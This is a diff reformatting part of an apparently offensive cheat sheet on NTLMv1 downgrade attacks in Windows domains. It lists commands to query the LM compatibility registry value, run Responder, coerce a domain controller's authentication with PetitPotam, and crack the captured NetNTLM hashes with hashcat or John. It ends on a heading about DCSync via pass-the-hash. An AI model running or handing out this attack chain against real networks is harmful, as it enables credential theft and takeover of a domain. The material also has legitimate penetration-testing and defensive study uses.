@@ -8,7 +8,7 @@
 
 ### LmCompatibilityLevel = 0x1: Send LM & NTLM
 
- - reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel
+    reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel
 
 ## Exploitation
 
@@ -16,21 +16,21 @@
 
 #### 2) Fire Responder
 
- - sudo responder -I eth0 --lm
+    sudo responder -I eth0 --lm
 
 ### If --disable-ess is set, extended session security will be disabled for NTLMv1 authentication
 
 #### 3) Force a callback
 
- - PetitPotam.exe Responder-IP DC-IP
+    PetitPotam.exe Responder-IP DC-IP
 
- - PetitPotam.py -u Username -p Password -d Domain -dc-ip DC-IP Responder-IP DC-IP
+    PetitPotam.py -u Username -p Password -d Domain -dc-ip DC-IP Responder-IP DC-IP
 
 #### 4) Crack the captured hashes with hashcat or John The Ripper
 
- - hashcat -m 5500 -a 3 hash.txt
+    hashcat -m 5500 -a 3 hash.txt
 
- - john --format=netntlm hash.txt
+    john --format=netntlm hash.txt
 
 #### 5) Now you can DCSync using the Pass-The-Hash with the DC machine account
 
